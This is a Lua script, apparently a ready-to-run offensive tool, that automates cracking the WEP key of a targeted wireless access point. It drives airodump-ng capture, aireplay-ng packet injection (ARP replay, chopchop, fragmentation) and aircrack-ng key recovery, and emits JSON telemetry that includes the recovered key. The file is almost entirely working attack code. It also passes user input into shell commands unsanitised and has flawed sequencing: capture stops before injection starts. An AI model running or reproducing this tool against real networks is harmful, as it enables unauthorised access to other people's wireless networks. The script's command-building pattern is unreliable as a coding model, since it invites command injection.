#!/usr/bin/env lua

local iface = arg[1]
local bssid = arg[2]
local channel = tonumber(arg[3]) or 1
local count = tonumber(arg[4]) or 20000
local method = arg[5] or "arp_replay"

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":' .. tostring(channel) .. ',"data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  if out:find("type monitor") then
    telemetry("monitor_ok", '{"message":"Monitor mode confirmed"}')
    return true
  end
  telemetry("monitor_fail", '{"message":"Interface not in monitor mode"}')
  return false
end

local function set_channel()
  os.execute("iw dev " .. iface .. " set channel " .. tostring(channel) .. " 2>/dev/null")
  telemetry("channel_set", '{"channel":' .. tostring(channel) .. '}')
end

local function iv_collect()
  local cmd = "airodump-ng -c " .. tostring(channel) .. " -w /tmp/wep_capture --bssid " .. bssid .. " " .. iface .. " 2>/dev/null &"
  telemetry("iv_collect_start", '{"method":"airodump","cmd":' .. json_escape(cmd) .. '}')
  os.execute(cmd)
  local elapsed = 0
  while elapsed < 30 do
    os.execute("sleep 5")
    elapsed = elapsed + 5
    local f = io.open("/tmp/wep_capture-01.cap", "rb")
    if f then
      local size = f:seek("end")
      f:close()
      telemetry("iv_progress", '{"elapsed":' .. tostring(elapsed) .. ',"file_size":' .. tostring(size) .. '}')
    end
  end
  os.execute("pkill -f 'airodump-ng.*" .. iface .. "' 2>/dev/null")
  telemetry("iv_collect_done", '{"file":"/tmp/wep_capture-01.cap"}')
end

local function arp_replay()
  telemetry("method_start", '{"method":"arp_replay"}')
  local cmd = "aireplay-ng -3 -b " .. bssid .. " -h 00:11:22:33:44:55 " .. iface .. " 2>/dev/null &"
  telemetry("arp_replay_cmd", '{"cmd":' .. json_escape(cmd) .. '}')
  os.execute(cmd)
  local sent = 0
  local f = io.popen("aireplay-ng -3 -b " .. bssid .. " " .. iface .. " 2>/dev/null")
  if f then
    while true do
      local line = f:read("*l")
      if not line then break end
      if line:find("ARP") or line:find("packet") then
        sent = sent + 1
        telemetry("arp_sent", '{"count":' .. tostring(sent) .. '}')
      end
    end
    f:close()
  end
  telemetry("arp_replay_done", '{"packets_sent":' .. tostring(sent) .. '}')
  return sent > 0
end

local function chopchop()
  telemetry("method_start", '{"method":"chopchop"}')
  local cmd = "aireplay-ng -4 -b " .. bssid .. " -h 00:11:22:33:44:55 " .. iface .. " 2>/dev/null"
  telemetry("chopchop_cmd", '{"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then return false end
  local progress = 0
  while true do
    local line = f:read("*l")
    if not line then break end
    local p = line:match("Progress: (%d+)")
    if p then
      progress = tonumber(p)
      telemetry("chopchop_progress", '{"percent":' .. tostring(progress) .. '}')
    end
    if line:find("Keystream") then
      telemetry("keystream_found", '{"data":' .. json_escape(line:sub(1, 150)) .. '}')
    end
  end
  f:close()
  telemetry("chopchop_done", '{"progress":' .. tostring(progress) .. '}')
  return progress > 50
end

local function fragmentation()
  telemetry("method_start", '{"method":"fragmentation"}')
  local cmd = "aireplay-ng -5 -b " .. bssid .. " -h 00:11:22:33:44:55 " .. iface .. " 2>/dev/null"
  telemetry("frag_cmd", '{"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then return false end
  local packets = 0
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("Fragment") or line:find("packet") then
      packets = packets + 1
      telemetry("frag_sent", '{"count":' .. tostring(packets) .. '}')
    end
  end
  f:close()
  telemetry("frag_done", '{"packets_generated":' .. tostring(packets) .. '}')
  return packets > 0
end

local function crack_wep()
  local cmd = "aircrack-ng -b " .. bssid .. " /tmp/wep_capture-01.cap 2>/dev/null"
  telemetry("crack_start", '{"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then return end
  local key = ""
  while true do
    local line = f:read("*l")
    if not line then break end
    local k = line:match("KEY FOUND! %[ ([^]]+) %]")
    if k then
      key = k
      telemetry("key_found", '{"wep_key":' .. json_escape(key) .. '}')
    end
    if line:find("Failed") then
      telemetry("crack_failed", '{"message":"Not enough IVs captured"}')
    end
  end
  f:close()
  telemetry("crack_done", '{"key":' .. json_escape(key) .. '}')
  return key ~= ""
end

if arg[1] == "--help" then
  print("Usage: wep_attacker.lua <interface> <bssid> [channel] [count] [method]")
  print("WEP cracking: arp_replay, chopchop, fragmentation")
  print("Example: wep_attacker.lua wlan0 00:11:22:33:44:55 6 50000 arp_replay")
  os.exit(0)
end

if not iface or not bssid then
  telemetry("error", '{"error":"Usage: wep_attacker.lua <interface> <bssid> [channel] [count] [method]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

set_channel()
iv_collect()

if method == "chopchop" then
  chopchop()
elseif method == "fragmentation" then
  fragmentation()
else
  arp_replay()
end

crack_wep()

telemetry("complete", '{"method":' .. json_escape(method) .. '}')
